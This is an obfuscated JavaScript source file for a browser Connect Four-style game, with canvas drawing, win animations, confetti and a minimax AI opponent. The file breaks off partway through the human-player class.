const _0x412c73 = _0x2d19;
(function (_0x2d3dd7, _0x10dbaa) {
    const _0x25b2f9 = _0x2d19, _0xa0b789 = _0x2d3dd7();
    while (!![]) {
        try {
            const _0x44cd9a = parseInt(_0x25b2f9(0xf4)) / 0x1 * (parseInt(_0x25b2f9(0xab)) / 0x2) + -parseInt(_0x25b2f9(0x94)) / 0x3 + parseInt(_0x25b2f9(0x98)) / 0x4 * (parseInt(_0x25b2f9(0x93)) / 0x5) + -parseInt(_0x25b2f9(0x137)) / 0x6 + parseInt(_0x25b2f9(0x139)) / 0x7 + -parseInt(_0x25b2f9(0xbf)) / 0x8 + -parseInt(_0x25b2f9(0xb7)) / 0x9 * (parseInt(_0x25b2f9(0xdd)) / 0xa);
            if (_0x44cd9a === _0x10dbaa)
                break;
            else
                _0xa0b789['push'](_0xa0b789['shift']());
        } catch (_0x35dd82) {
            _0xa0b789['push'](_0xa0b789['shift']());
        }
    }
}(_0x2f93, 0x5159a));
const BOARD_CONFIG = {
        'ROWS': 0x6,
        'COLUMNS': 0x8,
        'PLAYER_1_COLOR': _0x412c73(0xfd),
        'PLAYER_2_COLOR': _0x412c73(0xdb),
        'PIECE_STROKE_STYLE': _0x412c73(0x91),
        'MASK_COLOR': _0x412c73(0x11c)
    }, BoardPiece = {
        'EMPTY': 0x0,
        'PLAYER_1': 0x1,
        'PLAYER_2': 0x2,
        'DRAW': 0x3
    };
let gameState = {
    'board': null,
    'game': null,
    'currentPlayer': 0x1,
    'gameWon': ![],
    'isHumanTurn': !![],
    'winningPieces': []
};
class Board {
    constructor(_0x29dd25) {
        const _0x4ecfc9 = _0x412c73;
        this['canvas'] = _0x29dd25, this[_0x4ecfc9(0x9c)] = _0x29dd25['getContext']('2d'), this[_0x4ecfc9(0xe9)](), this[_0x4ecfc9(0x81)](), this[_0x4ecfc9(0x115)](), this[_0x4ecfc9(0xe0)]();
    }
    ['reset']() {
        const _0x20c919 = _0x412c73;
        this[_0x20c919(0x101)] = [];
        for (let _0x48bff5 = 0x0; _0x48bff5 < BOARD_CONFIG[_0x20c919(0x113)]; _0x48bff5++) {
            this[_0x20c919(0x101)][_0x20c919(0x112)]([]);
            for (let _0x2c1768 = 0x0; _0x2c1768 < BOARD_CONFIG[_0x20c919(0x122)]; _0x2c1768++) {
                this['map'][_0x48bff5]['push'](BoardPiece[_0x20c919(0xa2)]);
            }
        }
        this['winnerBoardPiece'] = BoardPiece['EMPTY'], this['winningPieces'] = [], this['clearCanvas']();
    }
    [_0x412c73(0xe9)]() {
        const _0x1ca320 = _0x412c73;
        return this[_0x1ca320(0xd4)] = window[_0x1ca320(0xb0)] < 0x280 ? 0.5 : 0x1, this['SCALE'];
    }
    [_0x412c73(0x81)]() {
        const _0x8f421f = _0x412c73;
        this[_0x8f421f(0x87)] = 0x1e0 * this['SCALE'], this['CANVAS_WIDTH'] = 0x280 * this[_0x8f421f(0xd4)], this[_0x8f421f(0x120)] = 0x19 * this[_0x8f421f(0xd4)], this[_0x8f421f(0x130)] = Math['max'](0x0, (this[_0x8f421f(0x9b)] - (0x3 * BOARD_CONFIG[_0x8f421f(0x122)] + 0x1) * this[_0x8f421f(0x120)]) / 0x2), this['MASK_Y_BEGIN'] = Math['max'](0x0, (this[_0x8f421f(0x87)] - (0x3 * BOARD_CONFIG[_0x8f421f(0x113)] + 0x1) * this[_0x8f421f(0x120)]) / 0x2), this['canvas'][_0x8f421f(0x8f)] = this['CANVAS_WIDTH'], this[_0x8f421f(0xb5)][_0x8f421f(0xb6)] = this[_0x8f421f(0x87)];
    }
    [_0x412c73(0xe0)]() {
        const _0x491bdc = _0x412c73, _0x27a63f = this[_0x491bdc(0xd4)];
        window[_0x491bdc(0xea)](_0x491bdc(0xfb), () => {
            const _0x798076 = _0x491bdc;
            this[_0x798076(0xe9)](), _0x27a63f !== this['SCALE'] && (this[_0x798076(0x81)](), this[_0x798076(0xa9)](), this[_0x798076(0xd7)]());
        });
    }
    async [_0x412c73(0x10c)](_0x39f690, _0x425a75) {
        const _0x2ce2d6 = _0x412c73;
        if (this['map'][0x0][_0x425a75] !== BoardPiece[_0x2ce2d6(0xa2)] || _0x425a75 < 0x0 || _0x425a75 >= BOARD_CONFIG['COLUMNS'])
            return ![];
        let _0x24b3fa = ![], _0x4c3453 = 0x0;
        for (let _0x4461b9 = 0x0; _0x4461b9 < BOARD_CONFIG[_0x2ce2d6(0x113)] - 0x1; _0x4461b9++) {
            if (this[_0x2ce2d6(0x101)][_0x4461b9 + 0x1][_0x425a75] !== BoardPiece['EMPTY']) {
                _0x24b3fa = !![], _0x4c3453 = _0x4461b9;
                break;
            }
        }
        return !_0x24b3fa && (_0x4c3453 = BOARD_CONFIG[_0x2ce2d6(0x113)] - 0x1), await this[_0x2ce2d6(0xe1)](_0x4c3453, _0x425a75, _0x39f690), this[_0x2ce2d6(0x101)][_0x4c3453][_0x425a75] = _0x39f690, this[_0x2ce2d6(0xd7)](), !![];
    }
    async [_0x412c73(0xe1)](_0x70e2cb, _0x1106ef, _0x17caef) {
        const _0x51c6ad = _0x412c73, _0x3c4572 = this[_0x51c6ad(0xce)](_0x17caef);
        let _0x21d039 = 0x0;
        const _0x306644 = 0x3 * this['PIECE_RADIUS'] * _0x70e2cb;
        while (_0x306644 >= _0x21d039) {
            this['clearCanvas'](), this['draw3DCircle']({
                'x': 0x3 * this[_0x51c6ad(0x120)] * _0x1106ef + this[_0x51c6ad(0x130)] + 0x2 * this['PIECE_RADIUS'],
                'y': _0x21d039 + this[_0x51c6ad(0x13a)] + 0x2 * this[_0x51c6ad(0x120)],
                'r': this['PIECE_RADIUS'],
                'fillStyle': _0x3c4572,
                'strokeStyle': BOARD_CONFIG['PIECE_STROKE_STYLE']
            }), this['render'](), _0x21d039 += this[_0x51c6ad(0x120)], await this[_0x51c6ad(0x136)]();
        }
        return playSound('drop'), !![];
    }
    [_0x412c73(0x8c)]() {
        const _0x574138 = _0x412c73;
        if (this[_0x574138(0xde)] !== BoardPiece[_0x574138(0xa2)])
            return this[_0x574138(0xde)];
        const _0x67817c = [
            [
                0x0,
                0x1
            ],
            [
                0x1,
                0x0
            ],
            [
                0x1,
                0x1
            ],
            [
                0x1,
                -0x1
            ]
        ];
        let _0x419226 = 0x0;
        for (let _0x506052 = 0x0; _0x506052 < BOARD_CONFIG['ROWS']; _0x506052++) {
            for (let _0x2286b3 = 0x0; _0x2286b3 < BOARD_CONFIG[_0x574138(0x122)]; _0x2286b3++) {
                const _0x5a90a4 = this['map'][_0x506052][_0x2286b3];
                if (_0x5a90a4 !== BoardPiece[_0x574138(0xa2)])
                    for (let [_0x14aec8, _0x73b1ab] of _0x67817c) {
                        const _0x394583 = this[_0x574138(0x86)](_0x506052, _0x2286b3, _0x5a90a4, _0x14aec8, _0x73b1ab);
                        if (_0x394583[_0x574138(0x83)] >= 0x4)
                            return this[_0x574138(0xde)] = _0x5a90a4, this[_0x574138(0xd0)] = _0x394583, _0x5a90a4;
                    }
                else
                    _0x419226++;
            }
        }
        if (_0x419226 === 0x0)
            return this[_0x574138(0xde)] = BoardPiece[_0x574138(0xf7)], BoardPiece['DRAW'];
        return BoardPiece['EMPTY'];
    }
    ['checkDirection'](_0x174d06, _0x514389, _0x5adda6, _0x3dcf14, _0x180227) {
        const _0x1b1fef = _0x412c73, _0x137cd1 = [];
        let _0x480dfd = _0x174d06, _0x46c46f = _0x514389;
        while (_0x480dfd >= 0x0 && _0x480dfd < BOARD_CONFIG[_0x1b1fef(0x113)] && _0x46c46f >= 0x0 && _0x46c46f < BOARD_CONFIG[_0x1b1fef(0x122)] && this['map'][_0x480dfd][_0x46c46f] === _0x5adda6) {
            _0x137cd1[_0x1b1fef(0x112)]({
                'row': _0x480dfd,
                'col': _0x46c46f
            }), _0x480dfd += _0x3dcf14, _0x46c46f += _0x180227;
        }
        _0x480dfd = _0x174d06 - _0x3dcf14, _0x46c46f = _0x514389 - _0x180227;
        while (_0x480dfd >= 0x0 && _0x480dfd < BOARD_CONFIG[_0x1b1fef(0x113)] && _0x46c46f >= 0x0 && _0x46c46f < BOARD_CONFIG[_0x1b1fef(0x122)] && this[_0x1b1fef(0x101)][_0x480dfd][_0x46c46f] === _0x5adda6) {
            _0x137cd1[_0x1b1fef(0x88)]({
                'row': _0x480dfd,
                'col': _0x46c46f
            }), _0x480dfd -= _0x3dcf14, _0x46c46f -= _0x180227;
        }
        return _0x137cd1;
    }
    async [_0x412c73(0xc8)]() {
        const _0x4d6654 = _0x412c73;
        if (this[_0x4d6654(0xde)] !== BoardPiece[_0x4d6654(0xa2)]) {
            this[_0x4d6654(0xde)] !== BoardPiece[_0x4d6654(0xf7)] && (await this['animateWinningPieces'](), this[_0x4d6654(0x124)]());
            let _0x2b1875 = _0x4d6654(0xa0);
            this[_0x4d6654(0xde)] === BoardPiece[_0x4d6654(0xf7)] ? (_0x2b1875 += _0x4d6654(0x133), playSound(_0x4d6654(0x13f))) : (_0x2b1875 += 'Player\x20' + this['winnerBoardPiece'] + _0x4d6654(0x104), playSound(_0x4d6654(0x13c))), _0x2b1875 += _0x4d6654(0xc7), this['showMessage'](_0x2b1875);
        }
    }
    async ['animateWinningPieces']() {
        const _0x398c6b = _0x412c73, _0xc655d7 = 0x7d0, _0x5b3d82 = Date['now']();
        while (Date[_0x398c6b(0xa7)]() - _0x5b3d82 < _0xc655d7) {
            this[_0x398c6b(0xd7)](!![]), await this[_0x398c6b(0x136)]();
        }
    }
    [_0x412c73(0x124)]() {
        const _0x548d62 = _0x412c73, _0x15f7b5 = [
                '#FFD700',
                _0x548d62(0x82),
                _0x548d62(0xa8),
                _0x548d62(0x129),
                _0x548d62(0xe5),
                '#FFEAA7'
            ], _0x2665cd = 0x32;
        for (let _0x28afa1 = 0x0; _0x28afa1 < _0x2665cd; _0x28afa1++) {
            const _0x19016c = document[_0x548d62(0xd5)]('div');
            _0x19016c['className'] = _0x548d62(0x10a), _0x19016c['style'][_0x548d62(0x92)] = _0x15f7b5[Math[_0x548d62(0x114)](Math['random']() * _0x15f7b5[_0x548d62(0x83)])], _0x19016c[_0x548d62(0xa5)]['left'] = Math[_0x548d62(0xe6)]() * 0x64 + '%', _0x19016c[_0x548d62(0xa5)][_0x548d62(0xa1)] = _0x548d62(0xc1), _0x19016c['style'][_0x548d62(0xc9)] = 'confettiExplosion\x20' + (0x2 + Math[_0x548d62(0xe6)]() * 0x3) + _0x548d62(0xc3), _0x19016c[_0x548d62(0xa5)][_0x548d62(0xe8)] = Math[_0x548d62(0xe6)]() * 0.5 + 's', document[_0x548d62(0x127)][_0x548d62(0xe2)](_0x19016c), setTimeout(() => {
                const _0x479d27 = _0x548d62;
                document[_0x479d27(0x127)]['removeChild'](_0x19016c);
            }, 0x1388);
        }
    }
    [_0x412c73(0xce)](_0x181e00) {
        const _0x4580e4 = _0x412c73;
        switch (_0x181e00) {
        case BoardPiece['PLAYER_1']:
            return BOARD_CONFIG['PLAYER_1_COLOR'];
        case BoardPiece[_0x4580e4(0xa4)]:
            return BOARD_CONFIG[_0x4580e4(0x8d)];
        default:
            return _0x4580e4(0xfe);
        }
    }
    [_0x412c73(0x89)]({
        x: x = 0x0,
        y: y = 0x0,
        r: r = 0x0,
        fillStyle: fillStyle = '',
        strokeStyle: strokeStyle = '',
        isWinning: isWinning = ![]
    }) {
        const _0x23cf10 = _0x412c73;
        this[_0x23cf10(0x9c)][_0x23cf10(0xbc)]();
        const _0x5895af = this['context'][_0x23cf10(0xdc)](x - r * 0.3, y - r * 0.3, 0x0, x, y, r);
        if (fillStyle === BOARD_CONFIG[_0x23cf10(0xd2)])
            _0x5895af[_0x23cf10(0x145)](0x0, _0x23cf10(0x12b)), _0x5895af['addColorStop'](0.3, _0x23cf10(0xfd)), _0x5895af[_0x23cf10(0x145)](0.7, '#D32F2F'), _0x5895af[_0x23cf10(0x145)](0x1, _0x23cf10(0xc2));
        else {
            if (fillStyle === BOARD_CONFIG[_0x23cf10(0x8d)])
                _0x5895af[_0x23cf10(0x145)](0x0, _0x23cf10(0x143)), _0x5895af[_0x23cf10(0x145)](0.3, '#0059ff'), _0x5895af[_0x23cf10(0x145)](0.7, _0x23cf10(0xcd)), _0x5895af[_0x23cf10(0x145)](0x1, _0x23cf10(0xb2));
            else
                fillStyle === 'transparent' && (_0x5895af['addColorStop'](0x0, _0x23cf10(0x128)), _0x5895af[_0x23cf10(0x145)](0x1, _0x23cf10(0xf9)));
        }
        fillStyle !== _0x23cf10(0xfe) && (this[_0x23cf10(0x9c)][_0x23cf10(0xd8)](), this[_0x23cf10(0x9c)][_0x23cf10(0x108)](x + 0x3, y + 0x3, r, 0x0, 0x2 * Math['PI'], ![]), this['context']['fillStyle'] = _0x23cf10(0x8e), this[_0x23cf10(0x9c)][_0x23cf10(0xdf)]());
        this[_0x23cf10(0x9c)][_0x23cf10(0xd8)](), this[_0x23cf10(0x9c)][_0x23cf10(0x108)](x, y, r, 0x0, 0x2 * Math['PI'], ![]), this[_0x23cf10(0x9c)][_0x23cf10(0xe4)] = fillStyle === _0x23cf10(0xfe) ? _0x5895af : _0x5895af, this[_0x23cf10(0x9c)][_0x23cf10(0xdf)]();
        if (isWinning) {
            this[_0x23cf10(0x9c)][_0x23cf10(0xd8)](), this[_0x23cf10(0x9c)][_0x23cf10(0x108)](x, y, r + 0x5, 0x0, 0x2 * Math['PI'], ![]), this[_0x23cf10(0x9c)]['fillStyle'] = _0x23cf10(0x96), this[_0x23cf10(0x9c)][_0x23cf10(0xdf)]();
            const _0x1559b1 = Date[_0x23cf10(0xa7)]() * 0.005, _0x529a75 = r + 0x8 + Math[_0x23cf10(0x106)](_0x1559b1) * 0x3;
            this[_0x23cf10(0x9c)]['beginPath'](), this[_0x23cf10(0x9c)][_0x23cf10(0x108)](x, y, _0x529a75, 0x0, 0x2 * Math['PI'], ![]), this[_0x23cf10(0x9c)][_0x23cf10(0xb4)] = _0x23cf10(0x134), this[_0x23cf10(0x9c)]['lineWidth'] = 0x2, this['context'][_0x23cf10(0x135)]();
        }
        strokeStyle && fillStyle !== _0x23cf10(0xfe) && (this[_0x23cf10(0x9c)]['beginPath'](), this['context'][_0x23cf10(0x108)](x, y, r, 0x0, 0x2 * Math['PI'], ![]), this[_0x23cf10(0x9c)][_0x23cf10(0xb4)] = strokeStyle, this[_0x23cf10(0x9c)]['lineWidth'] = 0x2, this[_0x23cf10(0x9c)][_0x23cf10(0x135)]());
        if (fillStyle !== _0x23cf10(0xfe)) {
            const _0x4ed483 = this[_0x23cf10(0x9c)][_0x23cf10(0xdc)](x - r * 0.4, y - r * 0.4, 0x0, x - r * 0.4, y - r * 0.4, r * 0.5);
            _0x4ed483[_0x23cf10(0x145)](0x0, _0x23cf10(0xd6)), _0x4ed483[_0x23cf10(0x145)](0x1, _0x23cf10(0x84)), this[_0x23cf10(0x9c)][_0x23cf10(0xd8)](), this[_0x23cf10(0x9c)][_0x23cf10(0x108)](x - r * 0.4, y - r * 0.4, r * 0.3, 0x0, 0x2 * Math['PI'], ![]), this[_0x23cf10(0x9c)][_0x23cf10(0xe4)] = _0x4ed483, this[_0x23cf10(0x9c)]['fill']();
        }
        this[_0x23cf10(0x9c)][_0x23cf10(0x103)]();
    }
    [_0x412c73(0x11a)]({
        x: x = 0x0,
        y: y = 0x0,
        r: r = 0x0,
        fillStyle: fillStyle = '',
        strokeStyle: strokeStyle = '',
        isWinning: isWinning = ![]
    }) {
        const _0x4fcc8a = _0x412c73;
        this[_0x4fcc8a(0x89)]({
            'x': x,
            'y': y,
            'r': r,
            'fillStyle': fillStyle,
            'strokeStyle': strokeStyle,
            'isWinning': isWinning
        });
    }
    [_0x412c73(0xcb)]() {
        const _0x2e21e4 = _0x412c73;
        this[_0x2e21e4(0x9c)]['save'](), this[_0x2e21e4(0x9c)]['fillStyle'] = BOARD_CONFIG[_0x2e21e4(0xcf)], this[_0x2e21e4(0x9c)]['beginPath']();
        const _0x470152 = 0x2 * this[_0x2e21e4(0x120)], _0x44d2a0 = 0x3 * this[_0x2e21e4(0x120)];
        for (let _0x224da7 = 0x0; _0x224da7 < BOARD_CONFIG[_0x2e21e4(0x113)]; _0x224da7++) {
            for (let _0x13b65e = 0x0; _0x13b65e < BOARD_CONFIG[_0x2e21e4(0x122)]; _0x13b65e++) {
                this[_0x2e21e4(0x9c)]['arc'](_0x44d2a0 * _0x13b65e + this['MASK_X_BEGIN'] + _0x470152, _0x44d2a0 * _0x224da7 + this['MASK_Y_BEGIN'] + _0x470152, this[_0x2e21e4(0x120)], 0x0, 0x2 * Math['PI']), this[_0x2e21e4(0x9c)][_0x2e21e4(0xef)](_0x44d2a0 * _0x13b65e + this[_0x2e21e4(0x130)] + 0x2 * _0x470152, _0x44d2a0 * _0x224da7 + this[_0x2e21e4(0x13a)], -_0x470152, _0x470152);
            }
        }
        this[_0x2e21e4(0x9c)]['restore']();
    }
    ['clearCanvas']() {
        const _0x50fdb1 = _0x412c73;
        this[_0x50fdb1(0x9c)][_0x50fdb1(0xca)](0x0, 0x0, this[_0x50fdb1(0xb5)][_0x50fdb1(0x8f)], this['canvas'][_0x50fdb1(0xb6)]);
    }
    [_0x412c73(0xd7)](_0x1aad56 = ![]) {
        const _0x371cf9 = _0x412c73;
        this[_0x371cf9(0xcb)]();
        for (let _0x14b634 = 0x0; _0x14b634 < BOARD_CONFIG[_0x371cf9(0x113)]; _0x14b634++) {
            for (let _0x1429b3 = 0x0; _0x1429b3 < BOARD_CONFIG[_0x371cf9(0x122)]; _0x1429b3++) {
                const _0x5bfdca = _0x1aad56 && this[_0x371cf9(0xd0)]['some'](_0x3621f7 => _0x3621f7['row'] === _0x14b634 && _0x3621f7['col'] === _0x1429b3);
                this[_0x371cf9(0x11a)]({
                    'x': 0x3 * this[_0x371cf9(0x120)] * _0x1429b3 + this[_0x371cf9(0x130)] + 0x2 * this[_0x371cf9(0x120)],
                    'y': 0x3 * this[_0x371cf9(0x120)] * _0x14b634 + this[_0x371cf9(0x13a)] + 0x2 * this['PIECE_RADIUS'],
                    'r': this['PIECE_RADIUS'],
                    'fillStyle': this[_0x371cf9(0xce)](this['map'][_0x14b634][_0x1429b3]),
                    'strokeStyle': BOARD_CONFIG[_0x371cf9(0x125)],
                    'isWinning': _0x5bfdca
                });
            }
        }
    }
    [_0x412c73(0x136)]() {
        return new Promise(_0x5b0f9d => requestAnimationFrame(_0x5b0f9d));
    }
    [_0x412c73(0x8a)](_0x47e752) {
        const _0x101258 = _0x412c73, _0x372398 = document[_0x101258(0xaf)]('.message'), _0x599295 = document[_0x101258(0xaf)]('.message-body-content'), _0xd3b485 = document[_0x101258(0xaf)](_0x101258(0x123));
        _0x372398[_0x101258(0xb8)][_0x101258(0xd9)](_0x101258(0x144)), _0x599295['innerHTML'] = _0x47e752;
        const _0xc183da = () => {
            const _0x14b70d = _0x101258;
            _0x372398['classList'][_0x14b70d(0xf2)](_0x14b70d(0x97)), _0x372398['addEventListener'](_0x14b70d(0xb9), () => {
                const _0x4dbdf6 = _0x14b70d;
                _0x372398[_0x4dbdf6(0xb8)][_0x4dbdf6(0xf2)]('hidden'), _0x372398[_0x4dbdf6(0xb8)][_0x4dbdf6(0xd9)]('invisible');
            }), _0xd3b485[_0x14b70d(0xf1)](_0x14b70d(0x131), _0xc183da);
        };
        _0xd3b485[_0x101258(0xea)]('click', _0xc183da);
    }
    [_0x412c73(0x8b)]({
        x: _0x22f0a7,
        y: _0xdc0b16
    }) {
        const _0x4710ac = _0x412c73;
        for (let _0x368259 = 0x0; _0x368259 < BOARD_CONFIG['COLUMNS']; _0x368259++) {
            const _0x3af958 = 0x3 * this[_0x4710ac(0x120)] * _0x368259 + this[_0x4710ac(0x130)] + 0x2 * this[_0x4710ac(0x120)];
            if ((_0x22f0a7 - _0x3af958) * (_0x22f0a7 - _0x3af958) <= this['PIECE_RADIUS'] * this['PIECE_RADIUS'])
                return _0x368259;
        }
        return -0x1;
    }
}
class AIPlayer {
    constructor(_0x375fd1) {
        const _0x1677d1 = _0x412c73;
        this['boardPiece'] = _0x375fd1, this[_0x1677d1(0xaa)] = _0x375fd1 === BoardPiece['PLAYER_1'] ? BoardPiece[_0x1677d1(0xa4)] : BoardPiece['PLAYER_1'], this[_0x1677d1(0xc4)] = 0x4;
    }
    async ['getMove'](_0x2fd91a) {
        const _0x111000 = _0x412c73, _0x20e274 = this[_0x111000(0xc6)](_0x2fd91a[_0x111000(0x101)]), _0x3e51e6 = this[_0x111000(0x110)](_0x20e274, 0x0, -Infinity, Infinity, !![]);
        return console[_0x111000(0x118)](_0x111000(0xe7) + this[_0x111000(0x102)] + _0x111000(0xfa) + _0x3e51e6[_0x111000(0x12a)] + _0x111000(0x90) + _0x3e51e6[_0x111000(0x12f)]), _0x3e51e6['column'];
    }
    ['minimax'](_0x1e1cce, _0x4d653b, _0x4150f8, _0x321d68, _0x67f5a3) {
        const _0x1e63b4 = _0x412c73, _0x5ce77e = this[_0x1e63b4(0x107)](_0x1e1cce);
        if (_0x4d653b === this['maxDepth'] || _0x5ce77e !== null)
            return {
                'score': this['getScore'](_0x1e1cce, _0x5ce77e, _0x4d653b),
                'column': -0x1
            };
        const _0x3350a3 = this[_0x1e63b4(0x13b)](_0x1e1cce);
        let _0x5e3507 = _0x3350a3[0x0];
        if (_0x67f5a3) {
            let _0x19e59 = -Infinity;
            for (let _0x29bab9 of _0x3350a3) {
                const _0x576093 = this['makeMove'](_0x1e1cce, _0x29bab9, this[_0x1e63b4(0x102)]), _0x2a9228 = this[_0x1e63b4(0x110)](_0x576093, _0x4d653b + 0x1, _0x4150f8, _0x321d68, ![])[_0x1e63b4(0x12f)];
                _0x2a9228 > _0x19e59 && (_0x19e59 = _0x2a9228, _0x5e3507 = _0x29bab9);
                _0x4150f8 = Math['max'](_0x4150f8, _0x2a9228);
                if (_0x321d68 <= _0x4150f8)
                    break;
            }
            return {
                'score': _0x19e59,
                'column': _0x5e3507
            };
        } else {
            let _0x1ba733 = Infinity;
            for (let _0x11ffa3 of _0x3350a3) {
                const _0x2652ce = this[_0x1e63b4(0x9d)](_0x1e1cce, _0x11ffa3, this['enemyPiece']), _0x4f9b97 = this[_0x1e63b4(0x110)](_0x2652ce, _0x4d653b + 0x1, _0x4150f8, _0x321d68, !![])[_0x1e63b4(0x12f)];
                _0x4f9b97 < _0x1ba733 && (_0x1ba733 = _0x4f9b97, _0x5e3507 = _0x11ffa3);
                _0x321d68 = Math[_0x1e63b4(0xfc)](_0x321d68, _0x4f9b97);
                if (_0x321d68 <= _0x4150f8)
                    break;
            }
            return {
                'score': _0x1ba733,
                'column': _0x5e3507
            };
        }
    }
    [_0x412c73(0x107)](_0x4a05d2) {
        const _0x1fdce0 = _0x412c73, _0x38131a = [
                [
                    0x0,
                    0x1
                ],
                [
                    0x1,
                    0x0
                ],
                [
                    0x1,
                    0x1
                ],
                [
                    0x1,
                    -0x1
                ]
            ];
        for (let _0xe25d79 = 0x0; _0xe25d79 < BOARD_CONFIG[_0x1fdce0(0x113)]; _0xe25d79++) {
            for (let _0x1eca8b = 0x0; _0x1eca8b < BOARD_CONFIG['COLUMNS']; _0x1eca8b++) {
                const _0x129dd = _0x4a05d2[_0xe25d79][_0x1eca8b];
                if (_0x129dd !== BoardPiece[_0x1fdce0(0xa2)])
                    for (let [_0x32e3c5, _0x9fa4] of _0x38131a) {
                        let _0x47bf62 = 0x1, _0x54db4f = _0xe25d79 + _0x32e3c5, _0x55578c = _0x1eca8b + _0x9fa4;
                        while (_0x54db4f >= 0x0 && _0x54db4f < BOARD_CONFIG[_0x1fdce0(0x113)] && _0x55578c >= 0x0 && _0x55578c < BOARD_CONFIG['COLUMNS'] && _0x4a05d2[_0x54db4f][_0x55578c] === _0x129dd) {
                            _0x47bf62++, _0x54db4f += _0x32e3c5, _0x55578c += _0x9fa4;
                        }
                        if (_0x47bf62 >= 0x4)
                            return _0x129dd;
                    }
            }
        }
        if (this[_0x1fdce0(0x13b)](_0x4a05d2)['length'] === 0x0)
            return BoardPiece[_0x1fdce0(0xf7)];
        return null;
    }
    ['getScore'](_0x232830, _0x3fbc93, _0x38bd65) {
        const _0x5754cd = _0x412c73;
        if (_0x3fbc93 === this['boardPiece'])
            return 0x3e8 - _0x38bd65;
        if (_0x3fbc93 === this['enemyPiece'])
            return -0x3e8 + _0x38bd65;
        if (_0x3fbc93 === BoardPiece['DRAW'])
            return 0x0;
        let _0x82575e = 0x0;
        const _0x57e80c = Math[_0x5754cd(0x114)](BOARD_CONFIG[_0x5754cd(0x122)] / 0x2);
        for (let _0x54dc42 = 0x0; _0x54dc42 < BOARD_CONFIG[_0x5754cd(0x113)]; _0x54dc42++) {
            for (let _0x1cddd0 = 0x0; _0x1cddd0 < BOARD_CONFIG[_0x5754cd(0x122)]; _0x1cddd0++) {
                if (_0x232830[_0x54dc42][_0x1cddd0] === this[_0x5754cd(0x102)])
                    _0x82575e += 0x3 - Math[_0x5754cd(0xf5)](_0x1cddd0 - _0x57e80c);
                else
                    _0x232830[_0x54dc42][_0x1cddd0] === this[_0x5754cd(0xaa)] && (_0x82575e -= 0x3 - Math['abs'](_0x1cddd0 - _0x57e80c));
            }
        }
        return _0x82575e;
    }
    [_0x412c73(0x13b)](_0x4d77cf) {
        const _0x4d0d7b = _0x412c73, _0x18d3ad = [];
        for (let _0x3b02a3 = 0x0; _0x3b02a3 < BOARD_CONFIG[_0x4d0d7b(0x122)]; _0x3b02a3++) {
            _0x4d77cf[0x0][_0x3b02a3] === BoardPiece[_0x4d0d7b(0xa2)] && _0x18d3ad['push'](_0x3b02a3);
        }
        return _0x18d3ad;
    }
    [_0x412c73(0x9d)](_0x4f1ae5, _0x5496c7, _0x51c92c) {
        const _0xfca5e1 = _0x412c73, _0x3eff84 = this['cloneBoard'](_0x4f1ae5);
        for (let _0x546628 = BOARD_CONFIG[_0xfca5e1(0x113)] - 0x1; _0x546628 >= 0x0; _0x546628--) {
            if (_0x3eff84[_0x546628][_0x5496c7] === BoardPiece[_0xfca5e1(0xa2)]) {
                _0x3eff84[_0x546628][_0x5496c7] = _0x51c92c;
                break;
            }
        }
        return _0x3eff84;
    }
    ['cloneBoard'](_0x53ef20) {
        return _0x53ef20['map'](_0x480d35 => [..._0x480d35]);
    }
}
class Game {
    constructor(_0x2c313c, _0x378d97) {
        const _0x493f76 = _0x412c73;
        this[_0x493f76(0xc0)] = _0x2c313c, this[_0x493f76(0x9e)] = new Board(_0x378d97), this[_0x493f76(0xd3)] = 0x0, this['gameWon'] = ![], this['moveAllowed'] = ![];
    }
    async ['start']() {
        const _0x2dc016 = _0x412c73;
        this[_0x2dc016(0x13d)] = !![], this[_0x2dc016(0xb3)] = ![], this[_0x2dc016(0x9e)][_0x2dc016(0x115)](), this[_0x2dc016(0x9e)][_0x2dc016(0xd7)](), this['updateMessage']('Player\x20' + (this[_0x2dc016(0xd3)] + 0x1) + _0x2dc016(0x116));
        while (!this[_0x2dc016(0xb3)]) {
            await this[_0x2dc016(0x9d)]();
            const _0x3e50cf = this[_0x2dc016(0x9e)][_0x2dc016(0x8c)]();
            if (_0x3e50cf !== BoardPiece['EMPTY']) {
                this[_0x2dc016(0xb3)] = !![], this[_0x2dc016(0x13d)] = ![], await this[_0x2dc016(0x9e)][_0x2dc016(0xc8)]();
                break;
            }
            this[_0x2dc016(0xd3)] = this['currentPlayerIndex'] === 0x0 ? 0x1 : 0x0, this['updateMessage'](_0x2dc016(0x142) + (this[_0x2dc016(0xd3)] + 0x1) + _0x2dc016(0x116));
        }
    }
    async ['makeMove']() {
        const _0x423639 = _0x412c73;
        if (!this[_0x423639(0x13d)])
            return;
        const _0x3bdfb0 = this[_0x423639(0xc0)][this[_0x423639(0xd3)]];
        let _0x590e24 = ![];
        while (!_0x590e24 && !this[_0x423639(0xb3)]) {
            const _0x1c97a3 = await _0x3bdfb0['getMove'](this['board']);
            this[_0x423639(0x13d)] = ![], _0x590e24 = await this[_0x423639(0x9e)][_0x423639(0x10c)](this[_0x423639(0xd3)] + 0x1, _0x1c97a3), this[_0x423639(0x13d)] = !![], !_0x590e24 && console[_0x423639(0x118)]('Invalid\x20move,\x20try\x20again');
        }
    }
    [_0x412c73(0x126)](_0x440872) {
        const _0x67b256 = _0x412c73, _0x36182c = document['querySelector']('.section-message');
        _0x36182c && (_0x36182c[_0x67b256(0xcc)] = _0x440872);
    }
    ['reset']() {
        const _0x35906a = _0x412c73;
        this[_0x35906a(0xd3)] = 0x0, this[_0x35906a(0xb3)] = ![], this[_0x35906a(0x13d)] = ![], this[_0x35906a(0x9e)][_0x35906a(0x115)](), this[_0x35906a(0x9e)]['render']();
    }
}
class HumanPlayer {
    constructor(_0x1d1be8) {
        const _0x1e1f99 = _0x412c73;
        this['canvas'] = _0x1d1be8, this[_0x1e1f99(0x85)] = null, this[_0x1e1f99(0x10f)]();
    }
    [_0x412c73(0x10f)]() {
        const _0x534a0d = _0x412c73;
        this[_0x534a0d(0xb5)]['addEventListener'](_0x534a0d(0x131), _0x3bb956 => {
            const _0x10e0ab = _0x534a0d, _0x2cdc12 = this[_0x10e0ab(0xb5)]['getBoundingClientRect'](), _0x243585 = _0x3bb956[_0x10e0ab(0xec)] - _0x2cdc12['left'], _0x2e9604 = _0x3bb956['clientY'] - _0x2cdc12['top'], _0x445674 = gameState[_0x10e0ab(0x9e)][_0x10e0ab(0x8b)]({
                    'x': _0x243585,
                    'y': _0x2e9604
                });
            this['clickResolver'] && _0x445674 >= 0x0 && this[_0x10e0ab(0x85)](_0x445674);
        });
    }
    async [_0x412c73(0x117)](_0x5d4e51) {
        return new Promise(_0x5c00c8 => {
            const _0x3e73b1 = _0x2d19;
